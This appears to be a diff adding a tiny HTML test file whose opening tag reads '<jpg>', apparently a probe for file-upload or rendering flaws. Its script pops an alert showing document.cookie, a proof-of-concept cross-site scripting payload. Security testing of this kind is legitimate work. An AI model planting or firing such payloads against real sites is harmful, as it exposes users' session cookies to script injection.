@@ -1,0 +1,10 @@
+<jpg>
+<head>
+<title>TEST</title>
+</head>
+<body>
+    <script>
+        alert(document.cookie+"ii xss");
+    </script>
+</body>
+</html>
